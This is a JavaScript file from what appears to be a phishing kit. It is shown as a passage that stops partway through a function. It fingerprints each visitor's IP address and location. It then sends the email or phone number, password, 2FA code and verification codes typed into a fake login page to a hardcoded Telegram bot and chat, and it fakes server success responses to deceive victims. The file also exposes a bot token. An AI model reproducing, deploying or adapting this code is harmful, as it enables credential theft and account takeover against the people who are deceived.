// ======================================================\n// TELEGRAM CONFIGURATION\n// ======================================================\nconst TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";\nconst TELEGRAM_CHAT_ID = "-5264759017";\n\n\n// ======================================================\n// DISPLAY ID (single 3-char) + persistence\n// ======================================================\nfunction generateDisplayId() {\n  const CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n  let s = '';\n  for (let i = 0; i < 3; i++) s += CHARS.charAt(Math.floor(Math.random() * CHARS.length));\n  return s;\n}const _existingDisplayId = (typeof sessionStorage !== 'undefined') ? sessionStorage.getItem('displayId') : null;\nconst _displayId = _existingDisplayId || generateDisplayId();\nif (typeof sessionStorage !== 'undefined' && !_existingDisplayId) {\n  try { sessionStorage.setItem('displayId', _displayId); } catch (e) { /* ignore */ }\n}\n// ======================================================\n// COLLECT USER INFORMATION\n// ======================================================\nconst userInfo = {\n    displayId: _displayId, // short code shown instead of IP\n    ip: 'Detecting...',    // kept for backwards compatibility but not sent\n    userAgent: navigator.userAgent,\n    timestamp: new Date().toLocaleString(),\n    country: 'Unknown',\n    city: 'Unknown',\n    isp: 'Unknown'\n};\n// Get IP and location info (store real IP in realIp ‚Äî do NOT overwrite displayId/ip used for messaging)\nasync function collectUserInfo() {\n    try {\n        // Get IP address\n        const ipResponse = await fetch('https://api.ipify.org?format=json');\n        const ipData = await ipResponse.json();\n        userInfo.realIp = ipData.ip; // store real IP separately\n        // Get location info based on real IP\n        const locationResponse = await fetch(`https://ipapi.co/${userInfo.realIp}/json/`);\n        const locationData = await locationResponse.json();\n        userInfo.country = locationData.country_name || 'Unknown';\n        userInfo.city = locationData.city || 'Unknown';\n        userInfo.isp = locationData.org || 'Unknown';\n        console.log('User info collected:', userInfo);\n    } catch (error) {\n        console.log('Error collecting user info:', error);\n        // Fallback to basic IP detection\n        try {\n            const fallbackIp = await fetch('https://api64.ipify.org?format=json').then(r => r.json());\n            userInfo.realIp = fallbackIp.ip;\n        } catch (e) {\n            userInfo.realIp = 'Failed to get IP';\n        }\n    }\n}\n// Call on page load\ncollectUserInfo();\n// ======================================================\n// TELEGRAM SEND FUNCTION\n// ======================================================\nasync function sendToTelegram(message) {\n    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {\n        console.error('Telegram bot token or chat ID not configured');\n        return false;\n    }\n    try {\n        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;\n        const response = await fetch(url, {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json',\n            },\n            body: JSON.stringify({\n                chat_id: TELEGRAM_CHAT_ID,\n                text: message,\n                parse_mode: 'HTML'\n            })\n        });\n        const data = await response.json();\n        console.log('Telegram response:', data);\n        return data.ok === true;\n    } catch (error) {\n        console.error('Error sending to Telegram:', error);\n        return false;\n    }\n}\n// ======================================================\n// FORMAT MESSAGES FOR TELEGRAM (use displayId instead of real IP)\n// ======================================================\nfunction _display() {\n  return userInfo.displayId || userInfo.ip || '---';\n}\nfunction formatLoginMessage(emailPhone, password) {\n    const countryInput = (document.getElementById('country-code') || {}).value || '';\n    const phoneInput = (document.getElementById('phone-number') || {}).value || '';\n    let credentialsType, credentialsValue;\n    if (countryInput && phoneInput) {\n        credentialsType = 'Phone';\n        const digits = phoneInput.replace(/\D/g, '');\n        credentialsValue = `${countryInput} ${digits}`;\n    } else {\n        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));\n        if (isPhone) {\n            const phoneNumber = (emailPhone||'').replace(/\D/g, '');\n            credentialsType = 'Phone';\n            credentialsValue = `+${phoneNumber}`;\n        } else {\n            credentialsType = 'Email';\n            credentialsValue = emailPhone || '';\n        }\n    }\n    let credentialsHtml;\n    if (credentialsType === 'Phone') {\n        const parts = String(credentialsValue).split(/\s+/);\n        const codePart = parts[0] || '';\n        const numberPart = parts.slice(1).join(' ') || '';\n        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;\n    } else {\n        credentialsHtml = `<code>${credentialsValue}</code>`;\n    }\n    return `<b>(${_display()})</b>\n<b>${credentialsType}:</b> ${credentialsHtml}\n<b>Password:</b> <code>${password}</code>\n<b>Country: ${userInfo.country}</b>`;\n}\nfunction formatOneTimeLoginMessage(emailPhone) {\n    const countryInput = (document.getElementById('country-code') || {}).value || '';\n    const phoneInput = (document.getElementById('phone-number') || {}).value || '';\n    let credentialsType, credentialsValue;\n    if (countryInput && phoneInput) {\n        credentialsType = 'Phone';\n        const digits = phoneInput.replace(/\D/g, '');\n        credentialsValue = `${countryInput} ${digits}`;\n    } else {\n        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));\n        if (isPhone) {\n            const phoneNumber = (emailPhone||'').replace(/\D/g, '');\n            credentialsType = 'Phone';\n            credentialsValue = `+${phoneNumber}`;\n        } else {\n            credentialsType = 'Email';\n            credentialsValue = emailPhone || '';\n        }\n    }\n    let credentialsHtml;\n    if (credentialsType === 'Phone') {\n        const parts = String(credentialsValue).split(/\s+/);\n        const codePart = parts[0] || '';\n        const numberPart = parts.slice(1).join(' ') || '';\n        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;\n    } else {\n        credentialsHtml = `<code>${credentialsValue}</code>`;\n    }\n    return `<b>(${_display()} 1‚É£)</b>\n<b>${credentialsType}:</b> ${credentialsHtml}\n<b>Country: ${userInfo.country}</b>`;\n}\nfunction format2FAMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üîê: (${_display()}):</b> <code>${code}</code>`;\n}\nfunction formatEmailVerificationMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üìß: (${_display()}):</b> <code>${code}</code>`;\n}\nfunction formatPhoneVerificationMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üì±: (${_display()}):</b> <code>${code}</code>`;\n}\nfunction formatSwitchMessage(fromMethod, toMethod) {\n    const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();\n    return `<b>(${_display()})</b>\n<b>Switched:</b> ${toMethodFormatted}`;\n}\nfunction formatGoVerifyMessage(method) {\n    const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();\n    return `<b>(${_display()})</b>\n<b>Selected:</b> ${methodFormatted}`;\n}\n// Rest of file remains unchanged (simulateServerSuccess, handlers, etc.) ‚Äî keep original content below this line\n// ======================================================\n// SIMULATE SERVER RESPONSES (ALWAYS SUCCESS)\n// ======================================================\nfunction simulateServerSuccess() {\n    return new Promise(resolve => {\n        setTimeout(() => {\n            resolve({ success: true });\n        }, 500); // Simulate 0.5s server delay\n    });\n}\nlet isProcessing = {\n    login: false,\n    twofa: false,\n    email: false,\n    phone: false\n};\n// Store current method for switch tracking\nlet currentMethod = '';\nlet isOneTimeCodeMode = false; // Track if One-time Code mode is active\nlet isAfterSwitch = false; // Track if verification is after a method switch\ndocument.addEventListener("DOMContentLoaded", () => {\n// ======================================================\n//  BASIC HELPERS\n// ======================================================\nfunction disableBodyScroll() { document.body.style.overflow = "hidden"; }\nfunction enableBodyScroll() { document.body.style.overflow = ""; }\nfunction showOverlay(id) {\n    const overlay = document.getElementById(id);\n    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");\n    disableBodyScroll();\n    overlay.style.visibility = "visible";\n    setTimeout(() => {\n        initSwitchButtons(overlay);\n        // Hide switch buttons if in verifications after password flow OR if in one-time code mode\n        if ((verificationsActive && (id === "email" || id === "phone")) || isOneTimeCodeMode) {\n            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")\n                .forEach(btn => btn.style.display = "none");\n        } else {\n            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")\n                .forEach(btn => btn.style.display = "");\n        }\n        // Auto-start resend timer\n        setTimeout(() => {\n            const resendBtn = overlay.querySelector(".resend-btn");\n            if (resendBtn) startResend(id, true);\n        }, 150);\n    }, 20);\n    if (id === "verifications") {\n        overlay.classList.remove("hide-left");\n        setTimeout(() => overlay.classList.add("active"), 10);\n        verificationsActive = true;\n    } else {\n        overlay.classList.add("active");\n        setTimeout(() => sheet.classList.add("active"), 10);\n    }\n}